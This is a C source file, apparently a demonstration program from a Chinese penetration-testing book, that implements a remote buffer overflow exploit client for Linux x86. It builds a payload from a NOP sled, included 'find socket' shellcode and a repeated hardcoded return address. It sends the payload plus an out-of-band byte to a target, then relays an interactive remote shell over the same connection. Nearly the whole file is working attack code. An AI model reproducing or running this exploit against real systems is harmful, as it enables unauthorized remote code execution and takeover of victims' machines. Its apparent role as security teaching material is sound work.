/* client_oob.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  use OOB find socket shellcode for Linux x86
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#include "shellcode_oob.c"

// maybe need adjust
#define RET 0xbffffccc;

// ripped from isno
int Make_Connection(char *address,int port,int timeout)
{
    struct sockaddr_in target;
    int s,i,bf;
    fd_set wd;
    struct timeval tv;

    s = socket(AF_INET,SOCK_STREAM,0);
    if(s<0)
        return -1;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(address);
    if(target.sin_addr.s_addr==0)
    {
        close(s);
        return -2;
    }
    target.sin_port = htons(port);
    bf = 1;
    ioctl(s,FIONBIO,&bf);
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    FD_ZERO(&wd);
    FD_SET(s,&wd);
    connect(s,(struct sockaddr *)&target,sizeof(target));
    if((i=select(s+1,0,&wd,0,&tv))==(-1))
    {
        close(s);
        return -3;
    }
    if(i==0)
    {
        close(s);
        return -4;
    }
    i = sizeof(int);
    getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);
    if((bf!=0)||(i!=sizeof(int)))
    {
        close(s);
        return -5;
    }
    ioctl(s,FIONBIO,&bf);
    return s;
}

/* ripped from TESO code */
void shell (int sock)
{
    int     l;
    char    buf[512];
    fd_set  rfds;

    while (1) {
        FD_SET (0, &rfds);
        FD_SET (sock, &rfds);

        select (sock + 1, &rfds, NULL, NULL, NULL);

        if (FD_ISSET (0, &rfds)) {
            l = read (0, buf, sizeof (buf));
            if (l <= 0) {
                perror ("read user");
                exit (EXIT_FAILURE);
            }
            write (sock, buf, l);
        }

        if (FD_ISSET (sock, &rfds)) {
            l = read (sock, buf, sizeof (buf));
            if (l <= 0) {
                perror ("read remote");
                exit (EXIT_FAILURE);
            }
            write (1, buf, l);
        }
    }
}

int main(int argc, char *argv[]) { 
    unsigned char Buff[1024];
    unsigned char data;
    
    unsigned long *ps;
    int s, i;
    
    if (argc < 3) {
        fprintf(stderr, "Usage: %s remote_ip remote_port\n", argv[0]);
        return -1;
    }

    s = Make_Connection(argv[1], atoi(argv[2]), 10);
    if (!s) {
        fprintf(stderr, "[-] Connect failed. \n");
        return -1;
    }

    GetShellcode();
    PrintSc(sh_Buff, sh_Len);

    memset(Buff, 0x90, sizeof(Buff));
    strcpy(Buff + (sizeof(Buff) - sh_Len - 1), sh_Buff);

    ps = (unsigned long *)Buff;
    for(i=0; i<128/4; i++)
    {
        *(ps++) = RET;
    }
    Buff[sizeof(Buff) - 1] = 0;
    
    i = send(s, Buff, sizeof(Buff), 0);
    if (i <= 0) {
        fprintf(stderr, "[-] Send failed. \n");
        return -1;
    }

    data='I';
    i = send(s, &data, 1, 1);
    if (i <= 0) {
        fprintf(stderr, "[-] Send OOB data failed. \n");
        return -1;
    }

    sleep (1);

    // get shell use same socket
    shell(s);
    
}
